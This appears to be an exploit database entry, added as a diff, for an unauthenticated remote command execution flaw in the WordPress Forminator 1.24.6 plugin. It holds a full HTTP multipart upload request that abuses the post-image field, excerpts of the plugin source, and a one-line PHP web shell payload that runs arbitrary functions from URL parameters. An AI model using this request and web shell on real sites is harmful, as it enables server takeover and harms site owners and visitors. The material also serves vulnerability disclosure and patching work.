@@ -1,0 +1,107 @@
+id: 38950
+date: 08/04/2023
+title: WordPress Forminator 1.24.6 Plugin - Unauthenticated Remote Command Execution Vulnerability
+author: Mehmet Kelepçe
+cves: 
+
+# Exploit Title: WordPress Plugin Forminator 1.24.6 - Unauthenticated Remote Command Execution
+# Exploit Author: Mehmet Kelepçe
+# Vendor Homepage: https://wpmudev.com/project/forminator-pro/
+# Software Link: https://wordpress.org/plugins/forminator/
+# Version: 1.24.6
+# Tested on: PHP - Mysql - Apache2 - Windows 11
+
+HTTP Request and vulnerable parameter:
+-------------------------------------------------------------------------
+POST /3/wordpress/wp-admin/admin-ajax.php HTTP/1.1
+Host: localhost
+Content-Length: 1756
+sec-ch-ua:
+Accept: */*
+Content-Type: multipart/form-data;
+boundary=----WebKitFormBoundaryTmsFfkbegmAjomne
+X-Requested-With: XMLHttpRequest
+sec-ch-ua-mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199
+Safari/537.36
+sec-ch-ua-platform: ""
+Origin: http://localhost
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: http://localhost/3/wordpress/2023/01/01/merhaba-dunya/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: wp-settings-time-1=1689794282;
+wordpress_test_cookie=WP%20Cookie%20check; wp_lang=tr_TR
+Connection: close
+
+.
+.
+.
+.
+.
+
+------WebKitFormBoundaryTmsFfkbegmAjomne
+Content-Disposition: form-data; name="postdata-1-post-image";
+filename="mehmet.php"
+Content-Type: application/octet-stream
+
+<?php
+$_GET['function']($_GET['cmd']);
+?>
+
+
+
+Source Code:
+wp-content/plugins/forminator/library/modules/custom-forms/front/front-render.php:
+--------------------------------------------------------------------
+        public function has_upload() {
+$fields = $this->get_fields();
+
+if ( ! empty( $fields ) ) {
+foreach ( $fields as $field ) {
+if ( 'upload' === $field['type'] || 'postdata' === $field['type'] ) {
+return true;
+}
+}
+}
+
+return false;
+}
+Vulnerable parameter: postdata-1-post-image
+
+and
+
+
+Source code:
+wp-content/plugins/forminator/library/fields/postdata.php:
+-------------------------------------------------------------------
+if ( ! empty( $post_image ) && isset( $_FILES[ $image_field_name ] ) ) {
+if ( isset( $_FILES[ $image_field_name ]['name'] ) && ! empty(
+$_FILES[ $image_field_name ]['name'] ) ) {
+$file_name = sanitize_file_name( $_FILES[ $image_field_name ]['name'] );
+$valid     = wp_check_filetype( $file_name );
+
+if ( false === $valid['ext'] || ! in_array( $valid['ext'],
+$this->image_extensions ) ) {
+$this->validation_message[ $image_field_name ] = apply_filters(
+'forminator_postdata_field_post_image_nr_validation_message',
+esc_html__( 'Uploaded file\'s extension is not allowed.', 'forminator' ),
+$id
+);
+}
+}
+}
+
+Vulnerable function: $image_field_name
+-------------------------------------------------------------------------
+
+Payload file: mehmet.php
+<?php
+$_GET['function']($_GET['cmd']);
+?>
+-------------------------------------------------------------------------
+
+#  0day.today [2023-08-09]  #
